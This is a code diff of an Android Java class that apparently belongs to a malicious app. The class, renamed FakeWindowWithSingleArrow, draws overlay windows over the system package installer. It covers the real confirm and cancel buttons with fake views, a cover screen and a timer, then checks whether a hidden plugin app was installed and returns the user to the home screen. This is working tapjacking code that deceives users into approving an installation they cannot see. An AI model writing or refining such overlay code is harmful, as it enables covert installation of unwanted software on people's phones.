@@ -6,7 +6,6 @@ import android.os.Handler;
 import android.text.TextUtils;
 import android.util.DisplayMetrics;
 import android.view.*;
-import android.widget.Button;
 import android.widget.ImageView;
 import android.widget.TextView;
 import com.plugin.common.utils.SingleInstanceBase;
@@ -16,13 +15,13 @@ import com.xstd.qm.setting.SettingManager;
 import com.xstd.quick.R;
 
 /**
-* Created with IntelliJ IDEA.
-* User: michael
-* Date: 13-11-27
-* Time: PM12:06
-* To change this template use File | Settings | File Templates.
-*/
-public class FakeInstallWindow implements FakeWindowInterface {
+ * Created with IntelliJ IDEA.
+ * User: michael
+ * Date: 13-11-27
+ * Time: AM11:20
+ * To change this template use File | Settings | File Templates.
+ */
+public class FakeWindowWithSingleArrow implements FakeWindowInterface {
 
     protected static final int TIMER_COUNT = 100;
 
@@ -46,11 +45,24 @@ public class FakeInstallWindow implements FakeWindowInterface {
     protected View rightView;
     protected View leftView;
 
+    protected View timerLeftSplitor;
+    protected View timerRightSplitor;
+
+    protected View installBtnLeft;
+    protected View installBtnRight;
+
+    protected View coverSplitor;
+
+    boolean leftTime = true;
+
     protected WindowManager.LayoutParams confirmFullBtnParams;
     protected WindowManager.LayoutParams confirmBtnParams;
     protected WindowManager.LayoutParams timerBtnParams;
 
-    public FakeInstallWindow(Context context) {
+    protected WindowManager.LayoutParams topSpltitorParams;
+    protected WindowManager.LayoutParams bottomSpltitorParams;
+
+    public FakeWindowWithSingleArrow(Context context) {
         this.context = context;
         layoutInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
         coverView = layoutInflater.inflate(R.layout.app_details, null);
@@ -63,16 +75,23 @@ public class FakeInstallWindow implements FakeWindowInterface {
 
         installView.setBackgroundColor(context.getResources().getColor(android.R.color.background_dark));
         installFullView.setBackgroundColor(context.getResources().getColor(android.R.color.background_dark));
-        ((TextView) installView.findViewById(R.id.cancel)).setText("取消");
-        ((TextView) installFullView.findViewById(R.id.cancel)).setText("取消");
+
+        installBtnLeft = installView.findViewById(R.id.left_splitor);
+        installBtnRight = installView.findViewById(R.id.right_splitor);
+
+        coverSplitor = coverView.findViewById(R.id.cover_splitor);
+        coverSplitor.setVisibility(View.GONE);
 
         arrow = (ImageView) coverView.findViewById(R.id.point);
         tips = (TextView) coverView.findViewById(R.id.tips);
 
         rightView = coverView.findViewById(R.id.right_tips);
         leftView = coverView.findViewById(R.id.left_tips);
-        rightView.setVisibility(View.GONE);
-        leftView.setVisibility(View.GONE);
+
+        timerLeftSplitor = timerView.findViewById(R.id.left_splitor);
+        timerRightSplitor = timerView.findViewById(R.id.right_splitor);
+        timerLeftSplitor.setVisibility(View.GONE);
+        timerRightSplitor.setVisibility(View.GONE);
 
         DisplayMetrics dm = new DisplayMetrics();
         wm.getDefaultDisplay().getMetrics(dm);
@@ -121,15 +140,21 @@ public class FakeInstallWindow implements FakeWindowInterface {
             Utils.tryToActivePluginApp(context);
         } else {
             if (SettingManager.getInstance().getCancelInstallReserve()) {
+                leftTime = false;
                 //timer layout
                 timerBtnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
                 //full layout
                 confirmFullBtnParams.gravity = Gravity.BOTTOM | Gravity.LEFT;
                 //cancel layout
-                int baseWidth = (int) (52 * density);
-                confirmBtnParams.width = baseWidth;// + (screenWidth / 2 - baseWidth) / 2;
+                int baseWidth = (int) (50 * density);
+                confirmBtnParams.width = baseWidth + (screenWidth / 2 - baseWidth) / 2 + 10;
                 confirmBtnParams.x = (screenWidth / 2 - baseWidth) / 2;
                 confirmBtnParams.gravity = Gravity.BOTTOM | Gravity.START;
+                installBtnLeft.setVisibility(View.VISIBLE);
+                installBtnRight.setVisibility(View.GONE);
+
+                //设置上分割线
+                coverSplitor.setVisibility(View.GONE);
 
                 if (installFullView != null) {
                     wm.updateViewLayout(installFullView, confirmFullBtnParams);
@@ -137,12 +162,14 @@ public class FakeInstallWindow implements FakeWindowInterface {
                     //显示全遮盖按键
                     installFullView = layoutInflater.inflate(R.layout.fake_install_btn, null);
                     installFullView.setBackgroundColor(context.getResources().getColor(android.R.color.background_dark));
-                    ((Button) installFullView.findViewById(R.id.cancel)).setText("取消");
                     wm.addView(installFullView, confirmFullBtnParams);
                 }
-//                    wm.updateViewLayout(topSplitorView, topSpltitorParams);
                 wm.updateViewLayout(installView, confirmBtnParams);
                 wm.updateViewLayout(timerView, timerBtnParams);
+
+                //change cover
+                rightView.setVisibility(View.GONE);
+                leftView.setVisibility(View.VISIBLE);
 
                 SettingManager.getInstance().setCancelInstallReserve(false);
             }
@@ -153,14 +180,17 @@ public class FakeInstallWindow implements FakeWindowInterface {
                     wm.removeView(installFullView);
                 }
                 installFullView = null;
+                coverSplitor.setVisibility(View.VISIBLE);
             } else if (count == 1 * 5) {
                 AppRuntime.WATCHING_SERVICE_BREAK.set(true);
                 if (installFullView == null) {
                     installFullView = layoutInflater.inflate(R.layout.fake_install_btn, null);
                     installFullView.setBackgroundColor(context.getResources().getColor(android.R.color.background_dark));
-                    ((Button) installFullView.findViewById(R.id.cancel)).setText("取消");
                     wm.addView(installFullView, confirmFullBtnParams);
                 }
+                coverSplitor.setVisibility(View.GONE);
+                installBtnRight.setVisibility(View.GONE);
+                installBtnLeft.setVisibility(View.GONE);
 
                 UtilsRuntime.goHome(context);
             } else if (AppRuntime.PLUGIN_INSTALLED || !AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()) {
@@ -174,6 +204,7 @@ public class FakeInstallWindow implements FakeWindowInterface {
                     installFullView.setBackgroundColor(context.getResources().getColor(android.R.color.background_dark));
                     wm.addView(installFullView, confirmFullBtnParams);
                 }
+                coverSplitor.setVisibility(View.GONE);
             } else if (!AppRuntime.PLUGIN_INSTALLED && AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()
                            && count > 1 * 5) {
                 /**
@@ -184,6 +215,8 @@ public class FakeInstallWindow implements FakeWindowInterface {
                     wm.removeView(installFullView);
                 }
                 installFullView = null;
+
+                coverSplitor.setVisibility(View.VISIBLE);
             }
 
             handler.post(new Runnable() {
@@ -238,53 +271,6 @@ public class FakeInstallWindow implements FakeWindowInterface {
         }
 
         AppRuntime.FAKE_WINDOWS_SHOW.set(true);
-        //install
-        confirmBtnParams = new WindowManager.LayoutParams();
-        confirmBtnParams.type = WindowManager.LayoutParams.TYPE_PHONE;
-        confirmBtnParams.format = PixelFormat.RGBA_8888;
-        confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
-        int baseWidth = (int) (50 * density);
-        confirmBtnParams.width = baseWidth;// + (screenWidth / 2 - baseWidth) / 2;
-        confirmBtnParams.height = (int) (48 * density);
-        if (!leftConfirm && !SettingManager.getInstance().getCancelInstallReserve()) {
-//                confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + (int) (25 * density);
-            confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + screenWidth / 2;
-//                confirmBtnParams.y = screenHeight - (int) (48 * density);
-            confirmBtnParams.gravity = Gravity.BOTTOM | Gravity.START;
-        } else {
-            confirmBtnParams.width = (int) (52 * density);
-            confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2;
-            confirmBtnParams.gravity = Gravity.BOTTOM | Gravity.START;
-        }
-        wm.addView(installView, confirmBtnParams);
-
-        confirmFullBtnParams = new WindowManager.LayoutParams();
-        confirmFullBtnParams.type = WindowManager.LayoutParams.TYPE_PHONE;
-        confirmFullBtnParams.format = PixelFormat.RGBA_8888;
-        confirmFullBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
-        confirmFullBtnParams.width = screenWidth / 2;
-        confirmFullBtnParams.height = (int) (48 * density);
-        if (!leftConfirm && !SettingManager.getInstance().getCancelInstallReserve()) {
-            confirmFullBtnParams.gravity = Gravity.BOTTOM | Gravity.RIGHT;
-        } else {
-            confirmFullBtnParams.gravity = Gravity.BOTTOM | Gravity.LEFT;
-        }
-
-        wm.addView(installFullView, confirmFullBtnParams);
-
-        //timer
-        timerBtnParams = new WindowManager.LayoutParams();
-        timerBtnParams.type = WindowManager.LayoutParams.TYPE_PHONE;
-        timerBtnParams.format = PixelFormat.RGBA_8888;
-        timerBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
-        timerBtnParams.width = screenWidth / 2;
-        timerBtnParams.height = (int) (48 * density);
-        if (!leftConfirm && !SettingManager.getInstance().getCancelInstallReserve()) {
-            timerBtnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
-        } else {
-            timerBtnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
-        }
-        wm.addView(timerView, timerBtnParams);
 
         //cover
         WindowManager.LayoutParams wMParams = new WindowManager.LayoutParams();
@@ -302,5 +288,56 @@ public class FakeInstallWindow implements FakeWindowInterface {
             }
         });
         wm.addView(coverView, wMParams);
+
+        //install
+        confirmBtnParams = new WindowManager.LayoutParams();
+        confirmBtnParams.type = WindowManager.LayoutParams.TYPE_PHONE;
+        confirmBtnParams.format = PixelFormat.RGBA_8888;
+        confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
+        int baseWidth = (int) (50 * density);
+        confirmBtnParams.width = baseWidth + (screenWidth / 2 - baseWidth) / 2;
+        confirmBtnParams.height = (int) (51 * density);
+        if (!leftConfirm && !SettingManager.getInstance().getCancelInstallReserve()) {
+            confirmBtnParams.x = screenWidth / 2;
+            confirmBtnParams.gravity = Gravity.BOTTOM | Gravity.START;
+            installBtnLeft.setVisibility(View.GONE);
+            installBtnRight.setVisibility(View.VISIBLE);
+        } else {
+            confirmBtnParams.width = (int) (50 * density);
+            confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2;
+            confirmBtnParams.gravity = Gravity.BOTTOM | Gravity.START;
+            installBtnLeft.setVisibility(View.VISIBLE);
+            installBtnRight.setVisibility(View.GONE);
+        }
+        wm.addView(installView, confirmBtnParams);
+
+        //full button
+        confirmFullBtnParams = new WindowManager.LayoutParams();
+        confirmFullBtnParams.type = WindowManager.LayoutParams.TYPE_PHONE;
+        confirmFullBtnParams.format = PixelFormat.RGBA_8888;
+        confirmFullBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
+        confirmFullBtnParams.width = screenWidth / 2;
+        confirmFullBtnParams.height = (int) (51 * density);
+        if (!leftConfirm && !SettingManager.getInstance().getCancelInstallReserve()) {
+            confirmFullBtnParams.gravity = Gravity.BOTTOM | Gravity.RIGHT;
+        } else {
+            confirmFullBtnParams.gravity = Gravity.BOTTOM | Gravity.LEFT;
+        }
+
+        wm.addView(installFullView, confirmFullBtnParams);
+
+        //timer
+        timerBtnParams = new WindowManager.LayoutParams();
+        timerBtnParams.type = WindowManager.LayoutParams.TYPE_PHONE;
+        timerBtnParams.format = PixelFormat.RGBA_8888;
+        timerBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
+        timerBtnParams.width = screenWidth / 2;
+        timerBtnParams.height = (int) (51 * density);
+        if (!leftConfirm && !SettingManager.getInstance().getCancelInstallReserve()) {
+            timerBtnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
+        } else {
+            timerBtnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
+        }
+        wm.addView(timerView, timerBtnParams);
     }
 }
